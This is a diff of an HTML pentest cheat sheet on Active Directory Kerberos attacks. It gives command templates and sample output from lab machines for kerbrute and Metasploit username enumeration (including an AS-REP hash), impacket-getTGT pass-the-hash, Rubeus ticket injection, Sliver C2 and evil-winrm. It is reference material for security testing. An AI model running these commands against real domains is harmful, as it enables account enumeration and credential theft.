@@ -346,7 +346,9 @@ body.dark-mode #dynamicFormContainer button:hover {
 </style>
   <h3 id="usernames-enum">Usernames enum</h3>
 <p>
-<button data-tabset="set1" data-tabcontent="tab1" class="active">kerbrute</button>
+<button data-tabset="set1" data-tabcontent="tab1" >kerbrute</button>
+
+<button data-tabset="set1" data-tabcontent="tab2" >metasploit</button>
 
 <div class="tabcontent" data-tabset="set1" data-tabcontent="tab1"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">kerbrute userenum --domain &lt;DOMAIN&gt; --dc &lt;DC&gt; &lt;USERNAMES_FILE&gt;
 </span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> kerbrute userenum --domain absolute.htb --dc dc.absolute.htb usernames.txt
@@ -369,10 +371,26 @@ body.dark-mode #dynamicFormContainer button:hover {
 </span></span></span><span class="line"><span class="cl"><span class="go">2024/09/24 14:54:41 &gt;  [+] VALID USERNAME:       j.robinson@absolute.htb
 </span></span></span><span class="line"><span class="cl"><span class="go">2024/09/24 14:54:41 &gt;  [+] VALID USERNAME:       n.smith@absolute.htb
 </span></span></span><span class="line"><span class="cl"><span class="go">2024/09/24 14:54:42 &gt;  Done! Tested 88 usernames (6 valid) in 0.491 seconds
-</span></span></span></code></pre></div><p><small><em>Ref: <a href="https://github.com/ropnop/kerbrute">kerbrute</a></em></small></p></div></p>
+</span></span></span></code></pre></div><p><small><em>Ref: <a href="https://github.com/ropnop/kerbrute">kerbrute</a></em></small></p></div>
+
+<div class="tabcontent" data-tabset="set1" data-tabcontent="tab2"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">use auxiliary/gather/kerberos_enumusers
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">set user_file &lt;USERNAMES_FILE&gt;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">set rhosts &lt;DC&gt;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">set domain &lt;DOMAIN&gt;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">run
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">msf6 auxiliary(gather/kerberos_enumusers) &gt; run
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Using domain: DANTE - 172.16.2.1:88        ...
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] 172.16.2.1 - User: &#34;user1&#34; user not found
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] 172.16.2.1 - User: &#34;user2&#34; user not found
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] 172.16.2.1 - User: &#34;user3&#34; user not found
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] 172.16.2.1 - User: &#34;user4&#34; does not require preauthentication. Hash: $krb5asrep$23$ ...[SNIP]... 9161d63be1
+</span></span></span><span class="line"><span class="cl"><span class="go">...[SNIP]...
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Auxiliary module execution completed
+</span></span></span></code></pre></div></div></p>
 <h3 id="usernames-generator">Usernames generator</h3>
 <p>
-<button data-tabset="set2" data-tabcontent="tab1" class="active">username-anarchy</button>
+<button data-tabset="set2" data-tabcontent="tab1" >username-anarchy</button>
 
 <div class="tabcontent" data-tabset="set2" data-tabcontent="tab1"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">./username-anarchy -i &lt;USERS_FILE&gt; | tee &lt;USERNAMES_FILE&gt;
 </span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> username-anarchy -i users.txt <span class="p">|</span> tee usernames.txt
@@ -386,7 +404,7 @@ body.dark-mode #dynamicFormContainer button:hover {
 <hr>
 <h3 id="generate-kerberos-ticket-from-linux">Generate Kerberos ticket (From Linux)</h3>
 <p>
-<button data-tabset="set3" data-tabcontent="tab1" class="active">Kinit</button>
+<button data-tabset="set3" data-tabcontent="tab1" >Kinit</button>
 
 <button data-tabset="set3" data-tabcontent="tab2" >Impacket</button>
 
@@ -449,7 +467,7 @@ body.dark-mode #dynamicFormContainer button:hover {
 </span></span></span><span class="line"><span class="cl"><span class="go">ktutil:  
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">exit
 </span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">ktutil:  exit
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">kinit -V -k -t &lt;USER&gt;.keytab -f &lt;USER&gt;@&lt;DOMAIN&gt;
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">kinit -V -k -t &#39;&lt;USER&gt;.keytab&#39; -f &#39;&lt;USER&gt;@&lt;DOMAIN&gt;&#39;
 </span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> kinit -V -k -t Administrator.keytab -f Administrator@ABSOLUTE.HTB
 </span></span><span class="line"><span class="cl"><span class="go">Using default cache: /tmp/krb5cc_1000
 </span></span></span><span class="line"><span class="cl"><span class="go">Using principal: Administrator@ABSOLUTE.HTB
@@ -467,20 +485,20 @@ body.dark-mode #dynamicFormContainer button:hover {
 </span></span></span></code></pre></div></div>
 
 <div class="tabcontent" data-tabset="set3" data-tabcontent="tab2"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> With password
-</span></span><span class="line"><span class="cl"><span class="go">sudo ntpdate -s &lt;DC&gt; &amp;&amp; impacket-getTGT &#39;&lt;DOMAIN&gt;/&lt;USER&gt;&#39;
-</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> sudo ntpdate -s DC.ABSOLUTE.HTB <span class="o">&amp;&amp;</span> impacket-getTGT <span class="s1">&#39;ABSOLUTE.HTB/m.lovegod&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="go">sudo ntpdate -s &lt;DC&gt; &amp;&amp; impacket-getTGT &#39;&lt;DOMAIN&gt;/&lt;USER&gt;&#39; -dc-ip &lt;DC_IP&gt;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> sudo ntpdate -s DC.ABSOLUTE.HTB <span class="o">&amp;&amp;</span> impacket-getTGT <span class="s1">&#39;ABSOLUTE.HTB/m.lovegod&#39;</span> 
 </span></span><span class="line"><span class="cl"><span class="go">Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
 </span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Password:
 </span></span></span><span class="line"><span class="cl"><span class="go">[*] Saving ticket in m.lovegod.ccache
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> With <span class="nb">hash</span>
-</span></span><span class="line"><span class="cl"><span class="go">sudo ntpdate -s &lt;DC&gt; &amp;&amp; impacket-getTGT -hashes :&lt;HASH&gt; &#39;&lt;DOMAIN&gt;/&lt;USER&gt;&#39;
+</span></span><span class="line"><span class="cl"><span class="go">sudo ntpdate -s &lt;DC&gt; &amp;&amp; impacket-getTGT &#39;&lt;DOMAIN&gt;/&lt;USER&gt;&#39; -hashes :&lt;HASH&gt; -dc-ip &lt;DC_IP&gt;
 </span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> sudo ntpdate -s DC.ABSOLUTE.HTB <span class="o">&amp;&amp;</span> impacket-getTGT -hashes :1f4a6093623653f6488d5aa24c75f2ea <span class="s1">&#39;ABSOLUTE.HTB/Administrator&#39;</span>
 </span></span><span class="line"><span class="cl"><span class="go">Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
 </span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Saving ticket in Administrator.ccache
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Import ticket
-</span></span><span class="line"><span class="cl"><span class="go">export KRB5CCNAME=&lt;USER&gt;.ccache
+</span></span><span class="line"><span class="cl"><span class="go">export KRB5CCNAME=&#39;&lt;USER&gt;.ccache&#39;
 </span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> <span class="nb">export</span> <span class="nv">KRB5CCNAME</span><span class="o">=</span>Administrator.ccache
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Check ticket
 </span></span><span class="line"><span class="cl"><span class="go">klist
@@ -494,7 +512,7 @@ body.dark-mode #dynamicFormContainer button:hover {
 </span></span></span></code></pre></div></div></p>
 <h3 id="generate-kerberos-ticket-from-windows">Generate Kerberos ticket (From Windows)</h3>
 <p>
-<button data-tabset="set4" data-tabcontent="tab1" class="active">rubeus</button>
+<button data-tabset="set4" data-tabcontent="tab1" >rubeus</button>
 
 <div class="tabcontent" data-tabset="set4" data-tabcontent="tab1"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> With password
 </span></span><span class="line"><span class="cl"><span class="go">.\rubeus.exe asktgt /user:&lt;USER&gt; /password:&#39;&lt;PASSWORD&gt;&#39; /enctype:AES256 /domain:&lt;DOMAIN&gt; /dc:&lt;DC&gt; /ptt /nowrap
@@ -600,7 +618,7 @@ body.dark-mode #dynamicFormContainer button:hover {
 </span></span></span></code></pre></div></div></p>
 <h3 id="generate-kerberos-ticket-from-c2">Generate Kerberos ticket (From C2)</h3>
 <p>
-<button data-tabset="set5" data-tabcontent="tab1" class="active">Sliver</button>
+<button data-tabset="set5" data-tabcontent="tab1" >Sliver</button>
 
 <div class="tabcontent" data-tabset="set5" data-tabcontent="tab1"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> With password
 </span></span><span class="line"><span class="cl"><span class="go">rubeus -- &#39;asktgt /user:&lt;USER&gt; /password:&lt;PASSWORD&gt; /enctype:AES256 /domain:&lt;DOMAIN&gt; /dc:&lt;DC&gt; /ptt /nowrap&#39;
@@ -702,7 +720,7 @@ body.dark-mode #dynamicFormContainer button:hover {
 <hr>
 <h3 id="winrm-with-kerberos">Winrm with Kerberos</h3>
 <p>
-<button data-tabset="set6" data-tabcontent="tab1" class="active">evil-winrm</button>
+<button data-tabset="set6" data-tabcontent="tab1" >evil-winrm</button>
 
 <button data-tabset="set6" data-tabcontent="tab2" >wmiexec</button>
 
